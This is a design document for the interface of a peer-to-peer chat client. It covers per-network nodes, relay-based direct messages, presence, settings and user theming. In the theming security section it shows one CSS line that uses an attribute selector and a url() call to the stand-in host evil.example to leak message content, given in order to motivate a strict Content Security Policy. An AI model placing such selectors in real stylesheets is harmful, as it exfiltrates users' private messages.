# Interface

**Document status:** v0.5 — §4.2 fixes what settings is and how it is divided, §6.4 and §6.5 settle reset and the two things that must leave the document before a theme can reach them (D36, D37). Theming remains designed and unbuilt. Previously v0.4 — D29 (a relay is never shared between networks) and what it does and does not mean for §3's direct-message bootstrap;  an interface now exists and is a first pass, not a settled one: it
creates and joins networks, runs a node, renders a channel, brings the next member in, and gates
its chrome on permission. §1's workspace, **both halves of §5**, §4's first two questions and
most of §7's second are built; §2's tiering, §4.1's presence and §6's theming are not, and §7's
navigation question stays open by default rather than by decision
**Depends on:** `05` for the crate layout and API boundary; `01` §9 for presence; `03` §4 for
direct messages; App Hosting Spec §1.2 and §3.3 for the sandbox path
**Consumed by:** implementation

---

## 0. What This Document Is For

`05` fixes the *architecture* of the client — crates, the command/event boundary, the sync
engine, the sandbox path — and stops before anything about what the interface looks like or
how it behaves. That gap was real: eight design documents contained two UX commitments
between them, both incidental to sections about something else.

This document covers the interface. It does not restate `05`'s boundary rules; it assumes
them and describes what gets built on top.

**Three constraints from `05` shape everything here, and none are negotiable:**

1. The interface is HTML/CSS/JS in a webview, with Tauri v2 as the shell. App Hosting §1.2
   fixes the eventual sandbox as a webview, so a native GUI means writing the interface
   twice.
2. `kols-ui` holds no keys, no sockets and no files. Everything crosses `kols-api` as
   commands out and events in.
3. The same interface must re-host inside the sandbox against a *narrower* API (`05` §7),
   so it may never assume a capability the sandboxed build cannot refuse.

---

## 1. One Process, Many Networks

A user belongs to several networks and holds several direct-message conversations, and must
move between them without running the application more than once.

**Each network is a separate node, and that is forced rather than chosen.**
`keypair_for(identity)` derives the libp2p keypair from the *per-network* identity, so every
network a user belongs to already has its own peer id. The tempting optimisation — one swarm
multiplexing several networks — would mean one peer id across all of them, which correlates
identities Core §1.2 deliberately keeps unlinkable. **The resource-saving version of this
feature is the one that breaks the security model.** It is named here so that nobody
rediscovers it later as a performance idea.

**A direct message is a network** (`03` §4.3): starting one creates a network with the
sender as sole Founder. So the node count is `servers + conversations`, not `servers`, and a
user who messages thirty people is running thirty-odd nodes. §2 is the answer to that.

**So the client holds a workspace rather than a store.** A directory of networks, each its own
store, listed and chosen before anything else can happen — which also means *creating* one is
something the interface does rather than something a terminal must have done first. That was
the shape of the gap: creating a network lived in `kols init`, so a window could not offer it
without a second copy of the genesis requirements, and each of those is silent when missed —
the network looks fine until the first post is refused by its own author's node. One path, two
front ends.

**Having no network open is where somebody starts, not a failure.** The interface opens on a
picker; with exactly one network it opens that one, because being asked to choose between one
thing is noise.

**The picker offers joining before creating**, because those are not equally likely. Somebody
opening this client for the first time is usually holding an invite, and has one thing to do
which is not founding a network of their own. And a joiner who lands in a waiting room has
*succeeded*: under explicit intake an invite buys a connection and an identity and nothing
else until a member admits them (`02` §6.2), so the interface says that rather than showing an
empty network, which is what the same state looks like when nothing explains it.

**Honest limit, stated because the interface should not oversell it — and this is the
canonical statement the rest of the set defers to** (`00` §1, `03` §4.2/§4.6/§7, D29).
Unlinkability holds at the *identity* layer. Two of a user's identities connecting from one IP address remain
correlatable by any peer that is in both networks, and by any relay that sees both. The
protocol never claimed otherwise, and the interface must not imply it did.

---

## 2. Liveness: Hot, Warm and Cold

Not every network needs a live node at every moment. Three tiers, chosen per network:

| Tier | What is held | Wake latency | For |
|---|---|---|---|
| **Hot** | Connection open, gossip subscribed | Instant | The network in view |
| **Warm** | A relay *reservation*, no connection | One dial — sub-second | Direct messages, recent networks |
| **Cold** | Nothing | The poll interval | Everything else |

**Warm is the interesting one, and it rests on a distinction Core §5.3 already draws.**
Reservations and circuits are metered separately, and only the first is long-lived: a relay
caps concurrent circuits and holds each to **60 seconds and 256 KB**, because a relay's job
is connection *establishment* and not transport. A reservation has no such ceiling — it is
renewed indefinitely and costs the relay a table entry.

*The figures were 120 seconds and 8 MB when this was written, and §5.3 lowered them on
2026-08-22 so that a relay enforces §5.2 itself rather than trusting clients to. Nothing in
this section turns on the size: it is the separation that matters, and the smaller ceiling
makes the point harder rather than weaker.*

A held connection is not what is needed. What is needed is to be **dialable**, and that is
what a reservation is: long-lived, renewed periodically, cheap. The sender dials when it has
something to send.

**The dial is the wake signal.** An incoming stream wakes the handler, so there is no
"I am about to transmit" message to design, no extra round trip, and no new protocol. This
was very nearly specified as a custom wake-up ping; it is written down here as *not needed*
so the idea does not return.

**Keep-alive, where a connection genuinely is held** (direct or hole-punched pairs, which
have no 120-second ceiling): 2–5 minutes while the application is focused, 2 minutes flat
when it is backgrounded. `IDLE_CONNECTION_TIMEOUT` is currently 60 seconds and exists for a
DCUtR reason, so holding a connection past it needs traffic or a raised timeout on that path
specifically — not a global change.

**Cold poll interval is a user setting, defaulting to 10 minutes.** It never applies to
direct messages, which are warm whenever the application is running.

**What this cost, and the half of it that is now fixed.** `MemberBehaviour` used to be a
fixed struct: every node ran Kademlia, mDNS, identify, ping, relay client, DCUtR and every
request-response protocol. Thirty nodes meant thirty Kademlia routing tables running periodic
bootstrap queries and thirty swarms doing mDNS multicast on the LAN. The observation that
fixes it is that **a direct-message network has exactly two members and needs neither Kademlia
nor mDNS** — there is nobody to discover.

That half is done: **Core §5.1.1** makes discovery optional and `MemberNode::with_discovery`
builds a node without it (`06` §12), keeping everything else — such a node still listens,
dials, is dialable, relays, hole-punches, gossips and serves every request-response protocol.
One constraint comes with it: without a routing table there is no address book either, so a
discovery-less node dials **by address**. A conversation network has that address already, by
the same route it has the membership.

**The tiers above are this client's policy and are deliberately not in the protocol.** Whether
a node exists at this moment, and whether it holds a reservation while nothing is happening,
is a decision made over time by whoever is holding the nodes — a specification has no view on
it and needs none. What the protocol owes is the primitives, and reservations, dialability and
now the leaner behaviour set are all of them. So hot, warm and cold are built here: the client
chooses `Discovery::Off` for every conversation-profile network, and manages reservations over
the rest.

---

## 3. Direct Messages Must Not Require Setting Up a Relay

Two people starting a conversation cannot be asked to stand up infrastructure first. That
friction would make the feature unusable, and the design has to answer it rather than assume
somebody will.

**The shared network is already the rendezvous.** `03` §4.3 delivers the DM invite over a
direct peer-to-peer stream *inside* the shared network, carrying a voluntary identity link —
a signed common-ownership proof (Core §1.2). So by the time a DM network exists, each party
already knows which identity in the shared network the other one is.

**Therefore: bootstrap the DM connection over the shared-network connection.** The two
parties exchange their DM-network addresses across the connection they already have, then
coordinate a simultaneous open. Nothing new leaks — Bob already knows Alice's IP from the
shared network, and the identity link already told him who she is.

**The rejected alternative, and why.** Having a shared-network node *relay* DM traffic works
and is worse: it tells a third party which two DM identities are talking. Address exchange
tells nobody anything they did not already know. Relaying is the fallback, not the mechanism.

**The gate this needs, without which it is a disaster.** Address disclosure for network X
over network Y is permitted **only to a peer who is a member of X**, checked by replaying
X's governance log. Ungated, this is a "list your other identities' addresses" oracle and
unlinkability is gone wholesale. For a DM the check is trivially tight, since X has exactly
two members.

**When hole-punching fails** (symmetric NAT, CGNAT over IPv4): the DM does not connect.
Core §5.2 was corrected on 2026-08-22 and now says this plainly — there is no third tier, a
relayed circuit carries the DCUtR negotiation and nothing else, and a pair that cannot punch
reaches each other over IPv6 or not at all.

**This removes what used to be written here as the fallback**, and it is worth keeping the
correction visible: the shared network's bootstrap relay was going to serve the circuit, on
the reasoning that it "carries bytes and never inspects a join at all". It does carry bytes
— for a negotiation — and that is the whole of what it may carry. A DM riding a bootstrap
relay is exactly the thing §5.2 now refuses.

What survives is better rather than worse. The relay is still the **rendezvous** that lets two
NATed members negotiate a punch, which is the friction goal and needs no protocol change or
setup by either participant. And the privacy flag that used to sit here is gone with the
fallback: a relay that carries only a negotiation observes that two identities met, for as long
as a handshake takes, rather than watching a conversation. The §1 honest limit on IP correlation
still applies to the rendezvous itself.

Note the precision that still holds: *member* relays meter per-identity against replayed state
and would refuse an identity they cannot verify, so they are not the rendezvous either.

**A relay is never shared between two of a member's networks (D29), and that is a different
statement from the one below.** Reuse is technically possible — a bootstrap relay checks no
membership by design (Core §5.5: it replays no log and holds no capabilities), so it will serve
anyone who dials it. It is refused anyway: `kad` runs under libp2p's default protocol name and
`PROTOCOL_VERSION` is one string for every network, so two networks on one relay share a routing
table and their members become mutually discoverable. Two of one person's identities meeting
there is exactly the correlation Core §1.2 exists to prevent, and §1's honest limit — "any relay
that sees both" — would stop being incidental and become the normal case.

**Not currently enforced, which is worth saying plainly.** Nothing stops a founder designating
one address in two networks. The relay cannot refuse, having no way to know; enforcing it means
network-scoping the protocol names, which is a wire change rather than a client fix. What the
client *can* do meanwhile is refuse to designate a relay another of its own networks already
uses — it holds the workspace (§1), so it is the only party in a position to notice.

**None of that forbids the bootstrap above, and the distinction is the interesting part.** What
D29 refuses is a relay *designated by two networks*, carrying both as standing infrastructure.
The mechanism in this section is not that: it exchanges the DM network's addresses over a
connection that already exists between two people who have already identified themselves to each
other, and then opens a direct connection. **No relay is involved at all on the primary path**,
and nothing is disclosed that either party did not already hold.

**The fallback is where it gets subtle, and it is bounded rather than free.** When hole-punching
fails and the shared network's bootstrap relay carries the circuit, that relay does briefly serve
two networks. Two things bound it. A conversation-profile network runs `Discovery::Off` (§2), so
it has no routing table and joins nobody else's — the structural half of D29's problem, mutual
discoverability through a shared DHT, cannot arise. And the peer ids it sees are the DM network's,
which are unlinkable by key from the shared network's.

What remains is IP correlation, and it is real: the relay's operator sees one address holding a
reservation as a member of the shared network and as a party to a conversation, and can infer that
two of its members are talking. **That weakens a claim `03` §4.2 makes** — that a separate network
reveals nothing about the conversation to the server — against exactly one party, in exactly the
case where hole-punching failed. Worth keeping the fallback for, since the alternative is that
symmetric-NAT users have no direct messages at all, and worth stating rather than leaving inside
the earlier flag.

**One dependency follows, and it is easy to miss: `Discovery::Off` for conversation networks stops
being a resource optimisation and becomes a privacy requirement.** It is what keeps the fallback
from putting a DM node into the shared relay's routing table. `STATUS` carries it as O2, filed as
an efficiency item; it is load-bearing for this.

**Scope, recorded because it bounds what relay work is ever worth doing: there are no shared
relays and none are planned.** A relay here is a member of the network it serves, volunteered
under Core §4.3's opt-in, and the project does not intend to build third-party or pooled
relaying at any point. That is why the friction question above matters so much — with no pool
to fall back on, "two people cannot be asked to stand up infrastructure to talk" has to be
answered by the design rather than by an operator, and §3 is that answer.

---

## 4. Information Architecture

Discord's *information*, not its layout. Four questions the interface must answer at a
glance:

1. **Which network am I in?**
2. **What channels does it have, and which am I reading?**
3. **Who is on it, and are they around?**
4. **What can I do here that I could not do somewhere else?** — §5.

The first two are local state off governance replay and cost nothing.

### 4.1 Presence, and Not Lying About It

`01` §9 already specifies the mechanism: an ephemeral gossip topic, 30-second heartbeats,
coarse states `online | idle | dnd | invisible`, never stored and dropped on restart.
`invisible` is a real setting rather than a courtesy, because presence here is visible to
every member of a network. At scale it is subscribed **per channel in view** rather than
network-wide.

**What the interface must get right is the absence case.** With no server, "offline" and
"I have not heard from them" are the same observation. Discord can assert offline
authoritatively because every client is connected to it; we cannot, because a member may be
perfectly online and simply not reachable from here.

So the roster distinguishes **heard recently** from **no signal**, and never claims a member
is offline. The wording carries more weight than the colour of the dot: an interface that
renders "Offline" is stating something it does not know.

### 4.2 Settings, and the Line Down the Middle of It

Settings is one sheet with sections, and the sections are arranged around a distinction this
application cares about more than most: **some of what lives here is mine, and some of it is
the network's.**

Changing a font is local, private and undoable. Changing the network's name writes a
governance entry that every member replays and nobody can unwrite — it is the same act as
renaming a channel, arriving through a quieter door. A sheet that mixed the two would teach
people that everything in it is a preference, which is wrong about half of it. So the grouping
is by *what a click costs*, not by topic:

**Mine — local, private, never broadcast, undoable.**

- **Appearance** — the theme (§6): background, fonts, sizes, colours. Import, switch, and the
  reset D37 requires.
- **This device** — anything nothing else needs to know. Empty today, and named so that the
  first local preference has somewhere obvious to land instead of being filed under the
  network's business.

**The network's — signed, replayed by every joiner, permanent.**

- **Identity** — the display name this member claims. Filed here rather than beside appearance
  precisely because it *feels* local and is not: D27 makes a name a governance-log claim, and
  a member who thought it was a preference would be surprised by the one property that matters,
  which is that it is never released.
- **Network** — its name (D32) and its bootstrap relays. Gated on `define-policy` per §5, so
  for most members this section is absent rather than disabled.
- **Permissions** — roles and what they hold.

**Permissions is here provisionally, and the reason is worth writing down.** It is not a
setting. It is network governance, and it belongs with membership, moderation and the waiting
room in a surface that does not exist yet. It sits in this sheet because that surface does not
exist, not because this is where it goes — §7 carries the question, and an item parked in the
wrong room should say so rather than settle in.

**What may join this sheet later** is bounded by the same line: anything whose change is local
goes under *mine*, anything that writes to the log goes under *the network's*, and anything
that does neither is not a setting and wants a different home.

---

## 5. Chrome Follows Permission

Controls for actions a user cannot perform are not shown — invite creation being the first
case, since a member without the capability has no use for the button.

**Hiding is presentation, never enforcement.** `05` §3's first property is that there is no
ambient authority: every command names its target and the core re-checks permission on
receipt, rather than trusting that the interface only offered buttons the user was allowed
to press. The hidden button and the refused command are independent, and the second is the
one that matters. This is written down because a hidden control looks like a check and is
not one.

**That half is built, and it refuses in the type system rather than at review time.** The
gate hands back a value with no public constructor, so an executor cannot receive a command
that skipped it (D25).

**The presentation half is built too, and it asks the gate's own question rather than keeping a
second copy of the answer.** The shell resolves each capability against replayed state and hands
the interface a flag per control — `may_post`, `may_create_channel`, `may_invite` — so a member
without `approve-node` is shown no door, and a member without `chat:create-channel` no `+`.
There is no second permission model in the front end to drift from the first.

**One thing the interface must not get wrong about hiding, learned by getting it wrong.**
`hidden` is an attribute, and the browser's `[hidden] { display: none }` is the weakest rule
there is — so any rule setting `display` beats it. The picker rendered correctly with the
channel screen sitting *underneath* it, reachable by scrolling, because `.app { display: grid }`
won. `[hidden] { display: none !important }` is the fix, and the `!important` is right exactly
here: hiding is not a style choice a later rule may reasonably override, and a theme (§6) must
never be able to reveal a screen this client decided you are not on.

---

## 6. Theming

The client is themeable by its user, in the spirit of a personal page rather than a colour
picker. Themes are **local and visual only**: they change how this installation looks, never
what it does, and never anything another user sees.

### 6.1 What Is Themeable

Full restyling, including layout — position, size, spacing, and hiding elements. A user who
wants to rearrange or break their own client may. **Reset to default is therefore mandatory
and must be reachable without the theme's cooperation**, since a theme can hide the control
that would undo it.

**CSS only. Not HTML.** HTML means either script execution or a sanitiser, and sanitisers
are a permanent arms race. CSS under the policy below is a bounded problem with a complete
answer. This is a starting position, not a permanent ceiling — but structural customisation,
if wanted later, should arrive as layout slots and custom properties rather than as
injection.

### 6.2 The Security Argument, In Full

**CSS can exfiltrate data, and this is not theoretical.** Attribute selectors combined with
any URL-loading property turn a stylesheet into a data channel:

```css
.message[data-content^="secret"] { background: url(https://evil.example/leak-s); }
```

In a chat client that reaches message content, member names and channel names.

**CSS has exactly one way to leak: causing a network request.** `url()`, `@import` and
`@font-face src` are the complete set, and all three are subject to Content Security Policy.
Under a CSP that permits **no remote origins at all**, arbitrary user CSS cannot phone home
— not "is unlikely to", cannot. There is no second channel. Fonts ship locally; images come
from local files or `data:` URIs, which make no request.

This is why the answer to "is arbitrary user CSS safe" is yes *conditionally*, and the
condition is the whole of it.

**What CSP does not solve is spoofing.** A theme can hide or fake chrome, and App Hosting
§3.3 requires a consent prompt before any signed action in the sandboxed build. A theme that
can conceal that prompt is a serious problem, and no styling policy fixes it.

The fix is structural rather than restrictive: **security-critical surfaces render as native
Tauri dialogs, outside the themeable DOM entirely.** The consent prompt, the identity
display and the permission surface are not part of the document a theme can reach. A theme
may make the application unrecognisable and can never fake a signature prompt.

**This work is not specific to theming.** The sandbox path (`05` §7) needs the same CSP
discipline for hosted apps, so it would be built regardless.

### 6.3 Themes as Directories

A theme is a directory: `theme.css`, local assets, and a small manifest naming it and its
author. They live in the application data directory, are switched by swapping the active
stylesheet, and are saved and re-selected freely.

Sharing theme files is fine — the CSP is what makes it safe, not the provenance of the file
— but **importing one is an explicit action**, never silent, because a theme that
rearranges the interface is something a user should choose deliberately.

### 6.4 Reset Takes Two Doors, Because One of Them Is Inside the Room

§6.1 makes reset mandatory and requires it to work without the theme's cooperation. That is a
stronger constraint than it first reads: a theme may hide, move, cover, or shrink to nothing
any element in the document, so **no control inside the document can be the way out of a
theme.** A "reset" button a theme can `display: none` is not a reset, it is a reassurance.

Two doors are required, because they survive different failures (D37):

1. **A native application menu item.** Outside the document, unstyleable, and the ordinary
   path — this is the one people will actually use. It survives a theme that hides things.
2. **A launch flag that applies no theme at all.** It survives a theme that makes the window
   unusable before a menu can be reached, which a menu item cannot help with.

A keyboard shortcut is worth offering and is **not** the guarantee: it is undiscoverable at the
moment it is needed, which is the moment somebody is looking at an unreadable window and has
not read this document.

The same reasoning already exists one layer down. D30 keeps the terminal as the reference path
when the window misbehaves; this is that principle applied to the window's own appearance.

### 6.5 What Must Leave the Document Before a Theme Can Reach It

§6.2's structural fix is a **precondition of shipping theming**, not a follow-up to it. Two
things have to be true first.

**The network a member is looking at must not be themeable.** This is the spoof that matters
here, and it is specific to this application rather than general UI caution: networks are the
privacy boundary D29 exists to protect, so a theme that makes one network resemble another does
not cause confusion — it causes a message written into the wrong network, which is the exact
failure the unlinkability design is built to prevent. The remedy is cheap: **the window title
carries the network and the identity**, it is native chrome, and no stylesheet reaches it.

**Anything that asks a member to authorise something must be a native dialog.** Today the
confirmations are `window.confirm`, which is browser chrome rather than document, so this
already holds — by accident rather than by decision, which is worth converting into a decision
before a theme is around to test it. When App Hosting §3.3's consent prompt arrives for the
sandbox path, it inherits this requirement rather than discovering it.

Note what is *not* on this list. Permission-gated chrome (§5) stays in the document and stays
themeable: a theme that hides a control the member holds is self-inflicted, and a theme that
fabricates one grants nothing, because every command is re-checked on receipt and a button is
not a capability.

---

## 7. Open Questions

1. **Navigation shape.** §4 fixes what must be answerable; the arrangement that answers it
   is not decided. Explicitly not assumed to be Discord's three columns.
2. **The invite flow's remaining choices.** Built: an `approve-node` holder mints an invite,
   copies one string, watches the waiting room and admits from it, and a joiner who lands in
   the waiting room is told that is a success rather than shown an empty network. Still
   defaulted rather than decided: **use-count and expiry**, currently one join and
   twenty-four hours with nothing in the interface to change them — a founder inviting six
   people has to mint six times, which is a decision nobody made.
3. **How a warm network surfaces activity.** A message arriving on a network that is not in
   view has to be noticeable without every warm network demanding attention.
4. **What "recent" means for warm tier membership.** §2 says recent networks stay warm;
   the rule that decides which is not written.
5. **Attachment and media presentation**, including whether a theme may restyle inline media.
6. **Search surface** — `05` §3 has the command; where results live is undecided.
7. **Multi-device** (`05` §6) is designed and unbuilt; read state becomes shared when it
   lands, and the interface should not assume it is local forever.
8. **A governance surface.** Roles, membership, moderation and the waiting room are one
   subject and currently live in three places, with permissions parked in §4.2's settings
   sheet because nowhere better exists. What that surface is, and whether settings keeps a
   pointer to it or loses the section entirely, is undecided.
